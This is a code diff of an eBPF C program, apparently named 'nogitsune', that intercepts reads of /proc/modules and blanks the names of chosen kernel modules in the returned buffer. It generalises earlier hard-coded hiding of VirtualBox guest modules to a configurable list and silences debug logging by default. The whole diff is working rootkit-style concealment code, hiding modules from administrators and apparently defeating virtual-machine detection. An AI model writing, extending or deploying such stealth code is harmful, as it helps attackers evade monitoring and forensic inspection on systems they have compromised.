@@ -21,9 +21,26 @@
  #include <bpf/bpf_core_read.h>
  
  char LICENSE[] SEC("license") = "GPL";
+
+#if NOGITSUNE_DEBUG
+#define log_bpf(fmt, ...) bpf_printk(fmt, ##__VA_ARGS__)
+#else
+#define log_bpf(fmt, ...)
+#endif
  
  #define MAX_BUF_SIZE 8192
- 
+ #define MAX_MODULES_TO_HIDE 8
+ #define MAX_MODULE_NAME_LEN 32
+
+ /* Each entry stores "<name> " (the module name plus its trailing space
+  * separator from /proc/modules' "name size used_by ..." format) so a
+  * single bounded comparison both matches the name AND confirms it's
+  * followed by a separator, not just a longer name sharing the prefix.
+  * module_name_lens[i] is strlen(name)+1 (name plus that trailing space). */
+ const volatile int num_modules_to_hide = 0;
+ const volatile char modules_to_hide[MAX_MODULES_TO_HIDE][MAX_MODULE_NAME_LEN];
+ const volatile int module_name_lens[MAX_MODULES_TO_HIDE];
+
  struct {
      __uint(type, BPF_MAP_TYPE_HASH);
      __uint(max_entries, 4096);
@@ -59,13 +76,70 @@
      int hidden_count;
  };
  
+ /* Fixed source buffer of spaces to blank a matched module name with -
+  * length of the write is bounded/runtime but the source is always wide
+  * enough (same precedent as text_len in textreplace.bpf.c). */
+ static const char blank_spaces[MAX_MODULE_NAME_LEN] =
+     "                               ";
+
+ /* Compares chunk[0..len-1] against modules_to_hide[idx][0..len-1], where
+  * len = module_name_lens[idx] (name + trailing space). Manual unroll with
+  * compile-time indices, mirroring pidhide.bpf.c's cmp_pid(). */
+ static __always_inline int cmp_module(const char *chunk, int idx)
+ {
+     int len = module_name_lens[idx];
+     if (len <= 1 || len > MAX_MODULE_NAME_LEN - 1)
+         return 0;
+
+     if (len > 0  && chunk[0]  != modules_to_hide[idx][0])  return 0;
+     if (len > 1  && chunk[1]  != modules_to_hide[idx][1])  return 0;
+     if (len > 2  && chunk[2]  != modules_to_hide[idx][2])  return 0;
+     if (len > 3  && chunk[3]  != modules_to_hide[idx][3])  return 0;
+     if (len > 4  && chunk[4]  != modules_to_hide[idx][4])  return 0;
+     if (len > 5  && chunk[5]  != modules_to_hide[idx][5])  return 0;
+     if (len > 6  && chunk[6]  != modules_to_hide[idx][6])  return 0;
+     if (len > 7  && chunk[7]  != modules_to_hide[idx][7])  return 0;
+     if (len > 8  && chunk[8]  != modules_to_hide[idx][8])  return 0;
+     if (len > 9  && chunk[9]  != modules_to_hide[idx][9])  return 0;
+     if (len > 10 && chunk[10] != modules_to_hide[idx][10]) return 0;
+     if (len > 11 && chunk[11] != modules_to_hide[idx][11]) return 0;
+     if (len > 12 && chunk[12] != modules_to_hide[idx][12]) return 0;
+     if (len > 13 && chunk[13] != modules_to_hide[idx][13]) return 0;
+     if (len > 14 && chunk[14] != modules_to_hide[idx][14]) return 0;
+     if (len > 15 && chunk[15] != modules_to_hide[idx][15]) return 0;
+     if (len > 16 && chunk[16] != modules_to_hide[idx][16]) return 0;
+     if (len > 17 && chunk[17] != modules_to_hide[idx][17]) return 0;
+     if (len > 18 && chunk[18] != modules_to_hide[idx][18]) return 0;
+     if (len > 19 && chunk[19] != modules_to_hide[idx][19]) return 0;
+     if (len > 20 && chunk[20] != modules_to_hide[idx][20]) return 0;
+     if (len > 21 && chunk[21] != modules_to_hide[idx][21]) return 0;
+     if (len > 22 && chunk[22] != modules_to_hide[idx][22]) return 0;
+     if (len > 23 && chunk[23] != modules_to_hide[idx][23]) return 0;
+     if (len > 24 && chunk[24] != modules_to_hide[idx][24]) return 0;
+     if (len > 25 && chunk[25] != modules_to_hide[idx][25]) return 0;
+     if (len > 26 && chunk[26] != modules_to_hide[idx][26]) return 0;
+     if (len > 27 && chunk[27] != modules_to_hide[idx][27]) return 0;
+     if (len > 28 && chunk[28] != modules_to_hide[idx][28]) return 0;
+     if (len > 29 && chunk[29] != modules_to_hide[idx][29]) return 0;
+     if (len > 30 && chunk[30] != modules_to_hide[idx][30]) return 0;
+
+     return 1;
+ }
+
+ /* If mapping idx matches at this position, blank the name (not the
+  * trailing separator space it was matched against) and return 1. */
+ static __always_inline int try_hide_module(char *buf, int index, const char *chunk, int idx)
+ {
+     if (!cmp_module(chunk, idx))
+         return 0;
+     bpf_probe_write_user(buf + index, blank_spaces, module_name_lens[idx] - 1);
+     return 1;
+ }
+
  /*
-  * Scan for module names to hide:
-  * - vboxguest (9 chars)
-  * - vboxsf (6 chars)  
-  * - vboxvideo (9 chars)
+  * Scan for configured module names to hide.
   *
-  * Strategy: When we find the module name at start of line (after newline
+  * Strategy: When we find a module name at start of line (after newline
   * or at position 0), we overwrite it with spaces. This effectively
   * "blanks" the module name while keeping the line structure intact.
   *
@@ -75,14 +149,14 @@
  static long modules_scan_callback(u32 index, void *ctx)
  {
      struct scan_ctx *sc = ctx;
-     
-     if (index >= sc->len || index >= MAX_BUF_SIZE - 12)
+
+     if (index >= sc->len || index >= MAX_BUF_SIZE - MAX_MODULE_NAME_LEN)
          return 1;
-     
-     char chunk[12];
-     if (bpf_probe_read_user(chunk, 12, sc->buf + index) < 0)
+
+     char chunk[MAX_MODULE_NAME_LEN];
+     if (bpf_probe_read_user(chunk, MAX_MODULE_NAME_LEN, sc->buf + index) < 0)
          return 0;
-     
+
      /* Check if we're at start of line (index 0 or after newline) */
      int at_line_start = 0;
      if (index == 0) {
@@ -94,43 +168,25 @@
                  at_line_start = 1;
          }
      }
-     
+
      if (!at_line_start)
          return 0;
-     
-     /* Pattern: "vboxguest " (10 chars with space) */
-     if (chunk[0] == 'v' && chunk[1] == 'b' && chunk[2] == 'o' &&
-         chunk[3] == 'x' && chunk[4] == 'g' && chunk[5] == 'u' &&
-         chunk[6] == 'e' && chunk[7] == 's' && chunk[8] == 't' &&
-         chunk[9] == ' ') {
-         /* Replace module name with # to comment it visually */
-         char repl[10] = "#hidden  ";
-         bpf_probe_write_user(sc->buf + index, repl, 9);
-         sc->hidden_count++;
-         return 0;
-     }
-     
-     /* Pattern: "vboxsf " (7 chars with space) */
-     if (chunk[0] == 'v' && chunk[1] == 'b' && chunk[2] == 'o' &&
-         chunk[3] == 'x' && chunk[4] == 's' && chunk[5] == 'f' &&
-         chunk[6] == ' ') {
-         char repl[7] = "#hide ";
-         bpf_probe_write_user(sc->buf + index, repl, 6);
-         sc->hidden_count++;
-         return 0;
-     }
-     
-     /* Pattern: "vboxvideo " (10 chars with space) */
-     if (chunk[0] == 'v' && chunk[1] == 'b' && chunk[2] == 'o' &&
-         chunk[3] == 'x' && chunk[4] == 'v' && chunk[5] == 'i' &&
-         chunk[6] == 'd' && chunk[7] == 'e' && chunk[8] == 'o' &&
-         chunk[9] == ' ') {
-         char repl[10] = "#hidden  ";
-         bpf_probe_write_user(sc->buf + index, repl, 9);
-         sc->hidden_count++;
-         return 0;
-     }
-     
+
+     /* Manually-unrolled bounded loop over configured module names
+      * (mirrors pidhide.bpf.c's check_pid_match() pattern) */
+     if (num_modules_to_hide > 0 && try_hide_module(sc->buf, index, chunk, 0)) goto hidden;
+     if (num_modules_to_hide > 1 && try_hide_module(sc->buf, index, chunk, 1)) goto hidden;
+     if (num_modules_to_hide > 2 && try_hide_module(sc->buf, index, chunk, 2)) goto hidden;
+     if (num_modules_to_hide > 3 && try_hide_module(sc->buf, index, chunk, 3)) goto hidden;
+     if (num_modules_to_hide > 4 && try_hide_module(sc->buf, index, chunk, 4)) goto hidden;
+     if (num_modules_to_hide > 5 && try_hide_module(sc->buf, index, chunk, 5)) goto hidden;
+     if (num_modules_to_hide > 6 && try_hide_module(sc->buf, index, chunk, 6)) goto hidden;
+     if (num_modules_to_hide > 7 && try_hide_module(sc->buf, index, chunk, 7)) goto hidden;
+
+     return 0;
+
+ hidden:
+     sc->hidden_count++;
      return 0;
  }
  
@@ -193,7 +249,7 @@
      bpf_loop(len, modules_scan_callback, &sc, 0);
      
      if (sc.hidden_count > 0) {
-         bpf_printk("[MODULES] hidden %d vbox modules", sc.hidden_count);
+          log_bpf("[MODULES] hidden %d vbox modules", sc.hidden_count);
      }
      
      return 0;
